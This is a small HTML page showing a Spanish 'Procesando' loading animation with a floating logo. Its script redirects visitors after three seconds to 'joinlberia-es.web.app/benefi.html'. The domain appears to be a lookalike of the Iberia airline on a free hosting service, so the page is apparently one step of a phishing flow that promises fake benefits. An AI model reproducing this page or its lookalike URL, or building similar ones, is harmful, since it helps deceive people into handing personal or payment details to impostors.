<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Procesando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background: #ffffff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .wrapper {
      text-align: center;
      animation: fadeIn 0.6s ease;
    }

    .logo {
      width: 64px;          /* tamanho controlado */
      height: auto;
      margin-bottom: 20px;
      animation: float 1.8s ease-in-out infinite;
    }

    .text {
      font-size: 16px;
      color: #1f2937;
      margin-bottom: 12px;
    }

    .dots::after {
      content: "";
      animation: dots 1.5s steps(3, end) infinite;
    }

    @keyframes dots {
      0% { content: ""; }
      33% { content: "."; }
      66% { content: ".."; }
      100% { content: "..."; }
    }

    @keyframes float {
      0% { transform: translateY(0); }
      50% { transform: translateY(-6px); }
      100% { transform: translateY(0); }
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>

  <div class="wrapper">
    <img src="xxx1.svg" alt="process" class="logo">
    <div class="text">
      Procesando<span class="dots"></span>
    </div>
  </div>

  <script>
    // Redireciona ap√≥s 3 segundos
    setTimeout(function () {
      window.location.href = "https://joinlberia-es.web.app/benefi.html";
    }, 3000);
  </script>

</body>
</html>
